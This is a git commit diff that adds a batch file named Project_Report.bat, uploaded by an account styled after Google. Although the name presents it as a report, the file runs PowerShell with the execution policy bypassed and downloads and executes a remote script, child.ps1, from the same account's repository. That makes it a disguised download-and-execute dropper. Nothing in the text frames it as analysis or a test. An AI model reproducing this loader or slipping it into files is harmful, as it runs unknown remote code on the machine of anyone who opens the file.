39987af1cb70654af4dba1b7c49b2a4cb7537fd9
g00glecenter101-arch <g00glecenter101@gmail.com>
2026-02-03 20:14:02 +0500

    Add files via upload

---
+++ Project_Report.bat
@@ -0,0 +1,3 @@
+@echo off
+powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Normal -Command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g00glecenter101-arch/msht/refs/heads/main/child.ps1')"
+pause
